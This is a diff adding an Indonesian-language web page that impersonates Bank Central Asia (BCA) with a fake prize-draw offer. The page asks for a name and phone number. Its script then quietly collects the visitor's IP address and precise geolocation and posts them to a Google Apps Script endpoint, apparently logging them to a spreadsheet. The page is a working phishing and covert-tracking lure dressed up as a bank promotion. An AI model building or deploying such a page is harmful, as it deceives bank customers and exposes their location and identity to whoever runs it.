@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UNDIAN BERHADIAH BCA</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #0062a5 0%, #003c71 100%);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    
+    .container {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 500px;
+      overflow: hidden;
+      text-align: center;
+      color: #333;
+    }
+    
+    .header {
+      background: #0062a5;
+      color: white;
+      padding: 25px 20px;
+      position: relative;
+    }
+    
+    .header:after {
+      content: '';
+      position: absolute;
+      bottom: -15px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 30px;
+      height: 30px;
+      background: #0062a5;
+      border-radius: 50%;
+    }
+    
+    .header h1 {
+      font-size: 24px;
+      margin-bottom: 5px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .header p {
+      font-size: 16px;
+      opacity: 0.9;
+    }
+    
+    .bca-logo {
+      width: 100px;
+      margin: 0 auto 15px;
+      display: block;
+    }
+    
+    .content {
+      padding: 30px 20px;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #0062a5;
+    }
+    
+    .form-group input {
+      width: 100%;
+      padding: 14px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+    }
+    
+    .form-group input:focus {
+      border-color: #0062a5;
+      outline: none;
+    }
+    
+    .button {
+      display: inline-block;
+      background: #ffcb05;
+      color: #0062a5;
+      padding: 16px 32px;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: bold;
+      margin: 20px 0 10px;
+      cursor: pointer;
+      border: none;
+      transition: all 0.3s;
+      box-shadow: 0 4px 10px rgba(255, 203, 5, 0.3);
+      font-size: 16px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .button:hover {
+      background: #ffd54f;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(255, 203, 5, 0.4);
+    }
+    
+    .button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .status-card {
+      background: #f0f7ff;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 25px 0;
+      border-left: 4px solid #0062a5;
+      text-align: left;
+    }
+    
+    #status {
+      font-size: 16px;
+      line-height: 1.5;
+      color: #0062a5;
+    }
+    
+    .loading {
+      display: none;
+      margin: 20px auto;
+    }
+    
+    .loading-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0062a5;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.7);
+      text-align: center;
+    }
+    
+    .prize-image {
+      width: 100%;
+      max-width: 300px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+    
+    .info-text {
+      color: #0062a5;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    
+    @media (max-width: 600px) {
+      .container {
+        border-radius: 15px;
+      }
+      
+      .header {
+        padding: 20px 15px;
+      }
+      
+      .header h1 {
+        font-size: 20px;
+      }
+      
+      .button {
+        padding: 14px 28px;
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" alt="Logo BCA" class="bca-logo">
+      <h1>UNDIAN BERHADIAH BCA</h1>
+      <p>Dapatkan Kesempatan Menang Hadiah Spesial</p>
+    </div>
+    
+    <div class="content">
+      <img src="https://static.vecteezy.com/system/resources/previews/010/994/412/non_2x/gift-box-with-a-red-ribbon-isolated-on-white-background-present-for-celebration-illustration-free-vector.jpg" alt="Hadiah" class="prize-image">
+      
+      <p class="info-text">Isi data diri Anda di bawah ini untuk berpartisipasi dalam undian berhadiah dari BCA</p>
+      
+      <div class="form-group">
+        <label for="nama">Nama Lengkap:</label>
+        <input type="text" id="nama" placeholder="Masukkan nama lengkap Anda">
+      </div>
+      
+      <div class="form-group">
+        <label for="hp">Nomor HP:</label>
+        <input type="tel" id="hp" placeholder="Masukkan nomor handphone Anda">
+      </div>
+      
+      <button id="submitBtn" class="button" onclick="kirimData()">IKUTI UNDIAN SEKARANG</button>
+      
+      <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+        <p>Sedang memproses...</p>
+      </div>
+      
+      <div class="status-card">
+        <p id="status">Silakan isi data diri Anda dan klik "IKUTI UNDIAN SEKARANG"</p>
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer">
+    &copy; 2023 Bank BCA. Seluruh hak cipta dilindungi undang-undang.
+  </div>
+
+  <script>
+    // URL Google Apps Script
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbz8JbO2pH1Es-cXlGOCjeJTnHcFTFI7-uuZ4Qj6OwzX4Xp1g_g0tjv_mL4TQXKsbnOX7g/exec';
+    
+    // Elemen UI
+    const statusElement = document.getElementById('status');
+    const loadingElement = document.getElementById('loading');
+    const submitBtnElement = document.getElementById('submitBtn');
+    const namaElement = document.getElementById('nama');
+    const hpElement = document.getElementById('hp');
+    
+    // Fungsi untuk mendapatkan IP pengguna
+    async function dapatkanIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Gagal mendapatkan IP:', error);
+        return 'Tidak diketahui';
+      }
+    }
+    
+    // Fungsi untuk mendapatkan lokasi
+    function dapatkanLokasi() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject("Geolocation tidak didukung oleh browser ini.");
+        } else {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              resolve(`${lat},${lon}`);
+            },
+            (error) => {
+              reject("Gagal mendapatkan lokasi: " + error.message);
+            }
+          );
+        }
+      });
+    }
+    
+    // Fungsi untuk mengirim data
+    async function kirimData() {
+      // Validasi input
+      if (!namaElement.value.trim() || !hpElement.value.trim()) {
+        statusElement.textContent = "Harap isi nama lengkap dan nomor HP terlebih dahulu!";
+        return;
+      }
+      
+      // Tampilkan loading
+      loadingElement.style.display = 'block';
+      submitBtnElement.disabled = true;
+      statusElement.textContent = "Mengirim data...";
+      
+      try {
+        // Dapatkan data yang diperlukan
+        const waktu = new Date().toISOString();
+        const ip = await dapatkanIP();
+        const lokasi = await dapatkanLokasi();
+        
+        // Kirim data ke Google Sheets
+        const response = await fetch(scriptURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            time: waktu,
+            ip: ip,
+            lokasi: lokasi
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.result === 'success') {
+          statusElement.textContent = "Terima kasih! Data Anda telah terkirim. Selamat berpartisipasi dalam undian BCA!";
+        } else {
+          throw new Error(result.error);
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        statusElement.textContent = "Terjadi kesalahan: " + error.message;
+      } finally {
+        loadingElement.style.display = 'none';
+        submitBtnElement.disabled = false;
+      }
+    }
+    
+    // Event listener untuk input enter
+    hpElement.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        kirimData();
+      }
+    });
+  </script>
+</body>
+</html>
